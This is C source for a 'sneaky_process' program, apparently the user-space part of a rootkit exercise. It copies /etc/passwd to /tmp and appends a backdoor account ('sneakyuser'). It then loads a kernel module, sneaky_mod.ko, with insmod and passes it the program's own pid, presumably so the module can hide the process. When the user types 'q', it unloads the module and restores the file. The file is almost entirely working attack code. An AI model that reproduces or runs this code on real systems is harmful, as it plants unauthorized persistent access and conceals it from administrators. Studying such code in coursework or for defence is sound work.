#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//pid
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>

#define TARGETADDR "/etc/passwd"
#define TEMPADDR "/tmp/passwd"
#define NEWLINE "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash"

void copy_file(const char *target,const char *dest) {
    int buffer[10000];

    int src_fd = open(target, O_RDONLY);
    if (src_fd < 0) {
        printf("Cannot open source file\n");
        exit(-1);
    }

    int dest_fd = open(dest, O_WRONLY | O_CREAT | O_TRUNC,600);
    if (dest_fd < 0) {
        printf("Cannot open dest file\n");
        exit(-1);
    }
    int rd_fd, wr_fd;
    while (1) {
        rd_fd = read(src_fd, buffer, sizeof(buffer));
        if (rd_fd == 0) {
            break;//finished
        } else if (rd_fd < 0) {
            printf("Cannot read into buffer\n");
            exit(-1);
        } else {
            wr_fd = write(dest_fd, buffer, rd_fd);
            if (wr_fd < 0) {
                printf("Cannot write into dest\n");
                exit(-1);
            }
        }

    }
    close(src_fd);
    close(dest_fd);
}


void add_to_file(){

    FILE * f = fopen(TARGETADDR, "a"); // append mode
    if (f == NULL){
        printf( "Error:could not open file\n");
        exit(-1);
    }
    else{
        fputs(NEWLINE, f);
    }

    if (fclose(f)){
        printf("Cannot close file\n");
        exit(-1);
    }
}

void load_module(){
    //insmod sneaky_mod.ko myint=pid
    int pid = getpid();
    char mypid[64];   // system independent
    memset(mypid, 0, sizeof(mypid));
    sprintf(mypid,"mypid=%d", pid);
    char*argv[4];
    argv[0] = "insmod";
    argv[1] = "sneaky_mod.ko";
    argv[2] = mypid;
    argv[3] = NULL;

    pid_t ppid, w;
    int wstatus;

    if ((ppid = fork()) < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }
    else if (ppid == 0) {
        int status = execvp(argv[0], argv);
        if(status<0){
            printf("Cannot execute...");
            exit(-1);
        }
    }

    else {

        w = waitpid(ppid, &wstatus, WUNTRACED | WCONTINUED);
        if (w == -1) {
            perror("waitpid");
            exit(EXIT_FAILURE);
        }


    }

}


void begin_attack(){
    //copy /etc/passwd to /tmp/passwd
    copy_file(TARGETADDR,TEMPADDR);
    add_to_file();
    load_module();

    //open /etc/passwd and print a newline to the end
    //load sneaky module using insmod
}

void end_attack(){
    //rmmod sneaky_mod.ko
    char*argv[3];
    argv[0] = "rmmod";
    argv[1] = "sneaky_mod.ko";
    argv[2] = NULL;
    pid_t pid, w;
    int wstatus;

    if ((pid = fork()) < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }
    else if (pid == 0) {
        int status = execvp(argv[0], argv);
        if(status<0){
            printf("Cannot execute...");
            exit(-1);
        }
    }

    else {

        w = waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
        if (w == -1) {
            perror("waitpid");
            exit(EXIT_FAILURE);
        }


    }
    //Restore the /etc/passwd
    copy_file(TEMPADDR,TARGETADDR);


}

int main(){
    printf("sneaky_process pid = %d\n", getpid());
    while(1){

        begin_attack();
        //read chars until receives 'q'
        while(1){
            char char_in;
            printf("sneaky_process$: ");
            char_in = getchar();
            if (char_in == 'q'){ // exit

                end_attack();
                break;
            }
        }

        return EXIT_SUCCESS;


    }
}